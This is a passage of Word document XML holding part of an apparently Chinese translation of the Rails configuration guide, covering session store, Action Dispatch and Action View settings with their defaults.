          <w:ilvl w:val="0"/>
          <w:numId w:val="18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ActionController::Base.page_cache_extensions</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置缓存页(文件)的扩展名(如果请求已经有扩展名，那将忽略这个设置)。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.html</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55384891"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Active Record 会话存储也可以这样配置：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B44CF79" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18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ActiveRecord::SessionStore::Session.table_name</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置会话存储使用的表名。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D83BE9" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="188"/>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ActiveRecord::SessionStore::Session.primary_key</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置会话存储表 ID 栏的名字。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>session_id</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="077F234E" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>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ActiveRecord::SessionStore::Session.data_column_name</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置存放汇集了会话数据那栏的名字。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>data</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="337A09A7"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3.8 配置 Action Dispatch</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD12CD9" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="190"/>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config.action_dispatch.session_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置会话数据存储的名字。默认是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:cookie_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">；其它可选的包括 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:active_record_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:men_cache_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者你自己定义的类名。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B27139" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19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config.action_dispatch.tld_length</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置应用程序 TLD (顶级域)的长度.默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22AE833B" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19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ActionDispatch::Callbacks.before</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接受一个代码块，在请求之前运行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BED3B03" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19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ActionDispatch::Callbacks.to_prepare</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接受一个代码块，在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Action::Dispatch::Callbacks.before</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 之后运行，但在请求之前。</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>development</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">模式中每个请求都会运行这个代码块，但在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>production</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 模式下或者设置 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>cache_classes</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 true 的环境只运行一次.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76FDADFD" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="194"/>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ActionDispatch::Callbacks.after</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接受一个代码块，在请求之后运行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D08C32F"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3.9 配置 Action View</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5434E114"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config.action_view</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 包括了这些配置设置:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BAB919D" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19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config.action_view.field_error_proc</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 提供一个 HTML 生成器，用于显示 Active Record 的错误信息。默认为</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="5A0385A2" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4FFDE33D" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1587572230"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Proc.new</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>{ |html_tag, instance| %Q(&lt;div class="field_with_errors"&gt;#{html_tag}&lt;/div&gt;).html_safe }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="542A75F6" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19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config.action_view.default_form_builder</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 告诉Rails默认使用哪个表格创建器。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionView::Helpers::FormBuilder</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BFC3D99" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19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config.action_view.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接受一个日志类，这个类要遵循 Log4r 或者 Ruby 默认日志类的接口。该类会被用于记录来自 Action View 的信息。设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来关闭日志。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16D4119E" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="198"/>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config.action_view.erb_trim_mode</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 给出被ERB使用的修剪模式。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>'-'</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。更多信息查阅 </w:t>
      </w:r>
      <w:hyperlink r:id="rId875" w:history="1">
        <w:r w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ERB documentation</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (译者注: </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>&lt;%= content -%&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将清除 content 首尾的空白)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B497C3" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="199"/>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config.action_view.javascript_expansions</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是一个包含了扩展的哈希数组。这些扩展可以通过 JavaScript 导入标签被导入使用。默认情况下是这么定义的:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="26C4EB51" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B2F0AFB" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2109890230"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.action_view.javascript_expansions = { :defaults</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; %w(jquery jquery_ujs) }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6B845BBD"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然而，你也许像这样定义其它的扩展:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="1FAE4D1B" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4FC04F48" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="133257780"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.action_view.javascript_expansions[:prototype] = ['prototype', 'effects', 'dragdrop', 'controls']</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7CD0D760"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并且可以在视图里像这样进行引用:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
